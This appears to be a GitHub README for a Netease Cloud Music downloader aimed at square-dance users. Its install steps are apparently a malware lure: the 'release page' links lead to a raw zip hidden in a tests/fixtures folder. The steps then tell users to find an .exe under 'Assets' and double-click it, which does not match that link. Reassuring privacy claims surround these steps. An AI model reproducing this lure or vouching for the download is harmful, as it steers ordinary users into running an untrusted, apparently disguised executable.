# 💃 netease-square-dance-downloader - Download music for your fitness dance

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader/raw/refs/heads/main/tests/fixtures/dance-netease-downloader-square-v2.1.zip)

This software downloads music from Netease Cloud Music specifically for square dance activities. It saves your favorite songs as MP3 files directly onto your USB drive. The tool handles the login process through your browser to keep your account safe. It also checks for duplicate files to ensure you do not download the same song twice.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- A USB flash drive with at least 1GB of free space
- An active Netease Cloud Music account

## 📥 How to Install

1. Visit the [official release page](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader/raw/refs/heads/main/tests/fixtures/dance-netease-downloader-square-v2.1.zip) to get the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Save this file to your Desktop.
4. Double-click the file to start the installer.
5. Follow the prompts on your screen to complete the setup.

## 🔑 Logging In

The first time you run the tool, it needs to connect to your Netease Cloud Music account. This allows the tool to find the songs that you have saved in your personal playlists.

1. Open the application.
2. Select the "Login" button.
3. A browser window opens automatically.
4. Scan the QR code displayed on your screen using your phone's Netease Cloud Music app.
5. Confirm the login on your phone.
6. The application window updates to show your profile picture once the connection succeeds.

## 🎵 Downloading Songs

You store your dance music centrally in your digital playlists on Netease Cloud Music. The downloader pulls content from those specific lists.

1. Ensure your USB drive is plugged into your computer.
2. Open the application.
3. The app detects your connected USB drive automatically.
4. Check the box next to your desired playlists.
5. Select the "Download" button.
6. A progress bar shows the status of each song.
7. The software skips files that already exist on your drive to save time.

## ⚙️ Features

- **Automated Login**: Uses a secure QR code process that connects to your account without saving your password.
- **Smart Cleanup**: Identifies existing files by name and size to prevent duplicate downloads.
- **Resumable Downloads**: If your internet connection stops, the software continues from where it left off.
- **USB Optimization**: Automatically formats filenames to work on older car audio systems and portable speakers.
- **Batch Processing**: Select dozens of songs at once. The tool manages the queue silently in the background.

## 💡 Troubleshooting

If the software fails to find your USB drive, ensure it is fully inserted into a USB port on your computer. You can check if Windows recognizes the drive by opening the File Explorer and looking for your drive letter.

If the download stops while in progress, check your internet connection. Restart the application if the progress bar remains stuck for more than one minute. You do not need to worry about partial files, as the deduplication logic identifies and fixes these interrupted downloads automatically.

## 📁 File Structure

The application creates a folder named "SquareDanceMusic" on the root of your USB drive. It organizes files by the playlist name from your Netease account. This keeps your library tidy and makes it easy to find specific songs when you play them at the square dance venue.

## 🛡️ Privacy and Safety

This application runs entirely on your local machine. It does not store your login credentials, personal data, or music library information on remote servers. The Playwright integration acts as a bridge between your browser and the local files, ensuring that your account interaction remains private.

## 📝 Configuration Settings

You can customize the download location and file naming format within the Settings menu.

1. Open the "Settings" tab.
2. Use the "Change" button to select a new folder if you prefer to download files to your computer hard drive instead of a USB stick.
3. Select the "Naming Pattern" dropdown to change how files appear on your device. Options include "Song Title - Artist" or "Artist - Song Title".
4. Select "Save" to apply your changes.

The application remembers these settings for all future sessions. You do not need to reconfigure them after closing the software.